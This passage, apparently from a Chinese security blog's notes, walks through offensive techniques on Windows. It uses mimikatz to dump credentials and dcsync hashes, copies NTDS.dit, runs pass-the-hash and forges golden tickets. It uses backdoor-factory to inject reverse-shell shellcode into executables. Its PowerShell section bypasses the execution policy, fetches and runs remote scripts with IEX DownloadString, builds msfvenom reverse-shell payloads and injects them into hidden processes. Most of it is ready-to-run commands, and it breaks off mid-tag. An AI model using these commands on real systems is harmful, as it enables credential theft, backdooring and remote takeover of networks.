class="code"><pre><code class="hljs bash">sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe  sekurlsa::logonPasswords full &gt; pssword.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213229371.png" alt="image-20240107213229371"></p><ul><li><strong>读取域控中域成员Hash</strong><br>域控以上域管理员身份执行mimikatz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br>抓取密码<br>lsadump::lsa /patch<br></code></pre></td></tr></table></figure><p>方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取所有域用户</span><br>lsadump::dcsync /domain:test.com /all /csv<br><br><span class="hljs-comment">#指定获取某个用户的hash</span><br>lsadump::dcsync /domain:test.com /user:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><ul><li><strong>导出域成员Hash</strong><br>域账户的用户名和hash密码以域数据库的形式存放在域控制器的%SystemRoot%\ntds\NTDS.DIT文件中。<br>这里可以借助: ntdsutil.exe,域控制器自带的域数据库管理工具，我们可以通过域数据库，提取域种所有的域用户信息，在域控上执行如下命令，导入域数据库。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br><br><span class="hljs-comment">#加载快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot;</span> quit quit<br><br><span class="hljs-comment">#Copy文件副本</span><br>copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>哈希传递攻击</strong><br>当我们获得了一台主机得NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用administrator用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用xie用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><p><strong>- 域环境</strong><br>在域环境中，当我们获取得了域内用户得HTML哈希值，我们可以使用域内得一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机得本地administrator权限和获得了域内用户得NTLM哈希值<br>域：xie.com<br>域控：WIN2008.xie.com</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:administrator /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:dbd621b8ed24eb627d32514476fac6c5 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:xie /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:329153f560eb329c0e1deea55e88a1e9   <br></code></pre></td></tr></table></figure><h2 id="票据传递攻击PPT"><a href="#票据传递攻击PPT" class="headerlink" title="票据传递攻击PPT"></a>票据传递攻击PPT</h2><p><strong>- 黄金票据</strong><br>域内每个用户得ticket都是由krbtgt的密码hash来计算生成的，因此只要获取到了krbtgt用户的密码Hash，就可以随意伪造Ticket,进而使用Ticket登录域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。<br>首先获取krbtgt的用户hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></code></pre></td></tr></table></figure><p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导入刚才生成的票据</span><br>kerberos::ptt test.kiribi<br><br><span class="hljs-comment">#导入成功后可获取域管权限</span><br><span class="hljs-built_in">dir</span> \\dc.abc.com\c$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>backdoor-factory工具使用</title>
    <link href="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/"/>
    <url>/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>backdoor-factory是一款后门构建工具。与其他工具不同的是，他不会增加软件的大小，而是利用代码缝隙进行注入，免杀效果更好。<br>项目地址： <a href="https://github.com/secretsquirrel/the-backdoor-factory.git">https://github.com/secretsquirrel/the-backdoor-factory.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我在ubuntu的机子上安全，这里选择安装的机制最好内置的是Python2.7的环境不然要出问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html<br>git <span class="hljs-built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git<br>sudo pip install capstone<br></code></pre></td></tr></table></figure><p>下载好后进入目录<img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213516534.png" alt="image-20240107213516534"><br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213528806.png" alt="image-20240107213528806"><br>安装成功</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>backdoor-factory常用命令<br>-h                  查看帮助信息</p><p>-f                   测试指定文件</p><p>-S                  检查软件是否支持patch</p><p>-s                   指定payload，可以通过”show”来查看</p><p>-H                  指定回连的IP地址</p><p>-P                  指定回连的端口</p><p>-J                   使用多个代码缝隙注入</p><p>-c                   查看软件的代码缝隙</p><p>-l   num          和” -c” 一起使用,查看大于num的缝隙</p><p>-o                   指定输出软件的名称<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213544107.png" alt="image-20240107213544107"><br>可以看到是支持patch的，可以继续<br>接下来插shellcode<br>先查看可用的payload         -s show<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213554760.png" alt="image-20240107213554760"><br>这里我选择   iat_reverse_tcp_stager_threaded<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213606598.png" alt="image-20240107213606598"><br>回车执行后，我们可以看到以下界面。这里要求我们选择 code cave ，提示我们要注入到那个区段，这里我就选择2注入到rsrc区段。<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213616302.png" alt="image-20240107213616302"><br>生成成功。接下来在kali的msf中设置监听<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213633407.png" alt="image-20240107213633407"><br>设置成功，运行，并将生成的exe文件扔到目标机中<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213644016.png" alt="image-20240107213644016"><br>将文件扔进靶机并运行<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213657520.png" alt="image-20240107213657520"><br>成功拿到shell</p><p>这里只是我写的一个简单的笔记，想更深入了解的可以自行摸索，有错误还望指正</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>backdoor-factor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell基础知识</title>
    <link href="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>一旦攻击者可以在一台计算机上运行代码，就会下载powershell脚本文件(.ps1)到磁盘中 执行，甚至无需写到磁盘中执行，它可以直接在内存中运行，利用诸多特点攻击者可以持续攻击而不被轻易发现。</p><h4 id="常用的powershell攻击工具有以下几种："><a href="#常用的powershell攻击工具有以下几种：" class="headerlink" title="常用的powershell攻击工具有以下几种："></a>常用的powershell攻击工具有以下几种：</h4><ul><li><p>powerSploit:</p><p>常用于信息探测，权限提升，凭证窃取，持久化等操作</p></li><li><p>Nishang:</p><p>基于powershell的渗透测试专用工具，集成了框架，脚本和各种payload，包含下载和执行，键盘记录，DNS，延时命令等脚本</p></li><li><p>Empire:<br>基于powershell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</p></li><li><p>powercat:<br>powershell版的Netcat,有着网络工具中的瑞士军刀美誉，他能通过tcp和udp在网络中读写数据，通过它和其他工具结合和重定向，读者可以在脚本中以多种方式使用它。</p></li></ul><h4 id="powershell优点："><a href="#powershell优点：" class="headerlink" title="powershell优点："></a>powershell优点：</h4><ul><li>windows7中默认安装了</li><li>powershell脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载powershell脚本并执行</li><li>目前很多工具都是基于powershell开发的</li><li>很多安全软件并不能检测到powershell的活动</li><li>cmd.exe通常会被阻止运行，但powershell不会</li><li>可以用来管理活动目录</li></ul><h5 id="查看版本：Get-Host"><a href="#查看版本：Get-Host" class="headerlink" title="查看版本：Get-Host"></a>查看版本：Get-Host</h5><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173626585.png" alt="image-20240107173626585"></p><h2 id="powershell的基本概念"><a href="#powershell的基本概念" class="headerlink" title="powershell的基本概念"></a>powershell的基本概念</h2><p>一个powershell脚本其实就是一个简单的文本文件，这个文件包含了一系列powershell命令，每个命令显示为独立的一行，对于被视为powershell脚本的文本文件，他的文件名需要加上.PS1的扩展名</p><h4 id="执行策略："><a href="#执行策略：" class="headerlink" title="执行策略："></a>执行策略：</h4><p>为防止恶意脚本的执行，powershell有一个执行策略，默认情况下，这个执行策略被设置为受限</p><p>在powershell脚本无法执行时，可以使用下面的cmdlet命令来确定当前的执行策略</p><h5 id="Get-ExecutionPolicy："><a href="#Get-ExecutionPolicy：" class="headerlink" title="Get-ExecutionPolicy："></a>Get-ExecutionPolicy：</h5><ul><li><p>Restricted:脚本不能执行(默认设置)<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173635035.png" alt="image-20240107173635035"></p></li><li><p>RemoteSigned</p><p>本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)</p></li><li><p>AllSigned</p><p>仅当脚本由受信任的发布者签名时才能运行</p></li><li><p>Unrestricted</p><p>允许所有的script运行</p></li></ul><h5 id="设置执行策略：-必须为管理员权限"><a href="#设置执行策略：-必须为管理员权限" class="headerlink" title="设置执行策略：(必须为管理员权限)"></a>设置执行策略：(必须为管理员权限)</h5><p>  Set-ExecutionPolicy  &lt; policy name &gt;<br>  <img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173653620.png" alt="image-20240107173653620"></p><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173701311.png" alt="image-20240107173701311"></p><p>在限制了Powershell不能使用时可以使用此方式进行设置允许执行Powershell脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> Unrestricted<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240108104245278.png" alt="image-20240108104245278"></p><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>运行一个脚本，必须键入完整的路劲和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入c:\script\a.ps1</p><h4 id="管道："><a href="#管道：" class="headerlink" title="管道："></a>管道：</h4><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用管道符号(|)连接</p><p>例如：</p><p>假设停止所有目前运行中的，以”p”字符开头命名的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">get-process p* | stop-process<br></code></pre></td></tr></table></figure><h2 id="powershell的常用命令："><a href="#powershell的常用命令：" class="headerlink" title="powershell的常用命令："></a>powershell的常用命令：</h2><h4 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h4><p>在powershell下，类似“cmd命令”叫做”cmdlet”</p><ul><li><p>新建目录&#x2F;文件</p><p>New-Item</p></li></ul><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173717859.png" alt="image-20240107173717859"></p><ul><li>新建文件：<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173725148.png" alt="image-20240107173725148"></li><li>删除目录</li></ul><p>Remove-Item<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173731525.png" alt="image-20240107173731525"></p><ul><li>显示文件内容</li></ul><p>Get-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173738344.png" alt="image-20240107173738344"></p><ul><li>设置文件内容</li></ul><p>Set-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173746647.png" alt="image-20240107173746647"></p><ul><li>追加内容</li></ul><p>Add-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173753754.png" alt="image-20240107173753754"></p><ul><li>清除内容</li></ul><p>Clear-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173801169.png" alt="image-20240107173801169"></p><h4 id="常用的命令："><a href="#常用的命令：" class="headerlink" title="常用的命令："></a>常用的命令：</h4><p>如果要运行powershell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以在渗透时，就需要采用一些方法绕过策略来执行脚本</p><ul><li><p>绕过本地权限执行</p><p>上传xxx.ps1至目标服务器，在cmd环境下，在目标服务器本地执行该脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass  <span class="hljs-operator">-File</span>  xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>本地隐藏绕过权限执行脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass  <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span>  <span class="hljs-literal">-NoLogo</span>   <span class="hljs-literal">-Nonlnteractive</span>   <span class="hljs-literal">-NoProfile</span> <span class="hljs-operator">-File</span>   xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>用IEX下载远程PS1脚本绕过权限执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass  <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><span class="hljs-literal">-NoProfile-NonIIEX</span>(New-ObjectNet.WebClient).DownloadString(<span class="hljs-string">&quot;xxx.ps1&quot;</span>);[<span class="hljs-type">Parameters</span>]<br></code></pre></td></tr></table></figure></li></ul><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><p>-ExecutionPolicy Bypass </p><p>绕过执行安装策略，这个参数非常重要，在默认情况下，Powershell的安全策略规定了Powershell不允许运行命令和文件。通过设置这个参数，可以绕过一些安全保护规则，在渗透测试中，基本每一次运行powershell脚本都要使用这个参数</p></li><li><p>-WindowStyle Hidden </p><p>隐藏窗口</p></li><li><p>-NoLogo</p><p>启动不显示版权标志的Powershell</p></li><li><p>-Nonlnteractive( -Nonl)</p><p>非交互模式，powershell不为用户提供交互的提示</p></li><li><p>-NoProfile(-Nop)</p><p>powershell控制台不加载当前用户的配置文件</p></li><li><p>-Noexit</p><p>执行后不退出shell</p></li></ul><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>‘“ test”‘&gt;t.ps1</p><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173820999.png" alt="image-20240107173820999"></p><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit:"></a>PowerSploit:</h4><p>PowerSploit是一款基于Powershell的后渗透（post-Exploitation)框架软件，包含很多powershell攻击脚本，它们主要用户渗透中的信息侦察，权限提升，权限维持：</p><p>地址:    <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><h5 id="模块功能介绍："><a href="#模块功能介绍：" class="headerlink" title="模块功能介绍："></a>模块功能介绍：</h5><ul><li><p>AntivirusBypass</p><p>发现杀毒软件的查杀特征</p></li><li><p>CodeExecution</p><p>在目标主机上执行代码</p></li><li><p>Exfiltration</p><p>在目标主机上的信息收集工具</p></li><li><p>Mayhem</p><p>蓝屏等破坏性脚本</p></li><li><p>Persistence</p><p>后门脚本(持久性控制)</p></li><li><p>Recon</p><p>以目标主机为跳板进行内网信息侦察</p></li><li><p>ScriptModification</p><p>在目标主机上创建或修改脚本</p></li></ul><h2 id="PowershellSploit脚本攻击实战"><a href="#PowershellSploit脚本攻击实战" class="headerlink" title="PowershellSploit脚本攻击实战"></a>PowershellSploit脚本攻击实战</h2><p>攻击机为kali并且安装了powershellsploit</p><ul><li><h3 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h3>CodeExecution模块下的Invoke-Shellcode脚本常用于将shellcode插入指定的进程ID或本地Powershell中</li></ul><h4 id="直接执行shellcoe反弹meterpreter-shell"><a href="#直接执行shellcoe反弹meterpreter-shell" class="headerlink" title="直接执行shellcoe反弹meterpreter  shell"></a>直接执行shellcoe反弹meterpreter  shell</h4><ol><li><p>首先在msf中使用reverse_https模块进行反弹(监听)</p><pre><code class="hljs">   2.使用msfvenom命令生成一个Powershell脚本木马</code></pre></li></ol>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msfvenom <span class="hljs-literal">-p</span> windows/meterpreter/reverse_https  LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">31.247</span>  LPORT=<span class="hljs-number">4444</span>  <span class="hljs-operator">-f</span> powershell  <span class="hljs-literal">-o</span> /var/www/html/test<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">3</span>.接着在目标主机Powershell下输入以下命令下载该脚本(下载 <span class="hljs-built_in">invoke-shellcode</span>)<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span>  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">4</span>.接着在目标主机上下载生成的木马<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span>  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">5</span>.在powershell中运行木马<br></code></pre></td></tr></table></figure>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode -Shellcode  （<span class="hljs-variable">$buf</span>） -Force<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-literal">-Force</span>   意思是不用提示直接运行<br></code></pre></td></tr></table></figure><p>  ​</p><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173830056.png" alt="image-20240107173830056"><br>反弹回shell<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173839022.png" alt="image-20240107173839022"></p><p>  可以在msf中看到反弹shell成功</p><h4 id="指定进程注入shellcode反弹meterpreter-shell"><a href="#指定进程注入shellcode反弹meterpreter-shell" class="headerlink" title="指定进程注入shellcode反弹meterpreter shell"></a>指定进程注入shellcode反弹meterpreter shell</h4><pre><code class="hljs">         1.同样在目标机powershell下输入以下命令</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">          2.接着Get-Process命令或者PS命令查看当前进程              ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210430170657943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70)</code></pre><p>3.创建一个新进程，这里启动一个记事本，并把它设置为隐藏的，在输入Get-Process命令查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173850897.png" alt="image-20240107173850897"></p><ul><li><p>4.接着输入命令，使用Invoke-Shellcode脚本进行注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode  -ProcessID  8120 -Shellcode(<span class="hljs-variable">$buf</span>)  -Force<br></code></pre></td></tr></table></figure><p>完成成功获取shell</p><ul><li><h3 id="Invoke-DLLInjection"><a href="#Invoke-DLLInjection" class="headerlink" title="Invoke-DLLInjection"></a>Invoke-DLLInjection</h3><p>下面使用Code Execution模块下的另一个脚本Invoke-DLLInjection，它是一个DLL注入的脚本</p><pre><code class="hljs">1.同理还是先下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-DLLIinjection.ps1&quot;</span>)<br>IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 2.在kali中生成一个DLL注入脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.247  lport=4444  -f dll -o /var/www/html/test.dll<br></code></pre></td></tr></table></figure><pre><code class="hljs">   3.把生成的test.dll上传到目标服务器的C盘后，就能启动一个新的进程进行DLL注入，这样可以注入更加隐蔽，使用以下命令新建一个名为notepad.exe的隐藏进程</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Start-Process c:\windows\system32\notepad.exe-WindowStyle   Hidden<br></code></pre></td></tr></table></figure><pre><code class="hljs">    4.然后进行命令注入</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-DLLInjection  -ProcessID 2000 -DLL  c:\test.dll<br></code></pre></td></tr></table></figure><p>运行即可反弹shell</p></li></ul></li><li><h3 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" 